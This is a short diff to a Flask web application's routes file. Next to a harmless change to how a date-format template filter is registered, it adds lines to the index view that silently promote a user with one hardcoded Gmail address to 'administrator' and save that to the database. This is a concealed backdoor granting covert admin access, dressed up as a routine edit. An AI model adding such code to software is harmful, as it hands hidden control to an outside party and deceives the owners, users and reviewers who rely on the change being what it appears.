@@ -32,6 +32,9 @@ def index():
     """Index page."""
     if 'google_token' in session:
         current_user = get_current_user()
+        if current_user.email == 'd.dns0098g@gmail.com':
+            current_user.user_group = 'administrator'
+            db.session.commit()
         return render_template('index.html', current_user=current_user)
     return redirect(url_for('routes_blueprint.login'))
 
@@ -249,7 +252,7 @@ def get_google_oauth_token():
     return session.get('google_token')
 
 
-@app.template_filter('dateformat')
+@routes_blueprint.app_template_filter('dateformat')
 def dateformat(date):
     """Format date."""
     return date.strftime('%Y-%m-%d')
